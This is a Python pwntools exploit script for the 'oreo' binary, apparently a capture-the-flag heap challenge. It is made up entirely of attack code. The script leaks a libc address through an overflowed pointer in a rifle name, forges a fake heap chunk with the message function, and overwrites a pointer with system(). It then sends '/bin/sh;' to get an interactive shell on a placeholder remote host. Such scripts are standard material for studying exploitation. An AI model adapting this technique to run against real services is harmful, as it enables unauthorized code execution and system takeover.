from pwn import *
 
context.log_level = 'debug'
DEBUG = int(sys.argv[1]);
 
if(DEBUG == 0):
    r = remote("1.2.3.4", 23333);
elif(DEBUG == 1):
    r = process("./oreo");
elif(DEBUG == 2):
    r = process("./oreo");
    gdb.attach(r, '''source ./script''');
 
def halt():
    while(True):
        log.info(r.recvline());
 
def addRifle(name, description):
    r.sendline("1");
    r.sendline(name);
    r.sendline(description);
 
def showRifle():
    r.sendline("2");
 
def order():
    r.sendline("3");
 
def leaveMessage(message):
    r.sendline("4");
    r.sendline(message);
 
def exploit():
    libc = ELF("/lib/i386-linux-gnu/libc.so.6");
    addRifle("B"*0x1b + p32(0x804a280), "3" * 0x10);
    showRifle();
 
    r.recvuntil("Description:");
    r.recvuntil("Description: ");
    leakedValue = u32( r.recv(4));
    log.info("leaked value: 0x%x" % leakedValue);
 
    libcBase = leakedValue - libc.symbols["_IO_2_1_stdin_"];
    log.info("libc base address: 0x%x" % libcBase);
 

    for i in range(0, 0x3f):
        addRifle("A" * 0x1b + p32(0), "junk");
        order();

    gdb.attach(r)
    addRifle("B"*0x1b + p32(0x804a2a8), "junk");
    leaveMessage(p32(0)*9 + p32(0x41));		#fake chunk
    order();

    addRifle("ABCD", p32(0x804a258));		#0x804a2a8
    systemAddr = libcBase + libc.symbols["system"];
    leaveMessage(p32(systemAddr));
    r.sendline("/bin/sh;");
    r.interactive();
 
exploit();

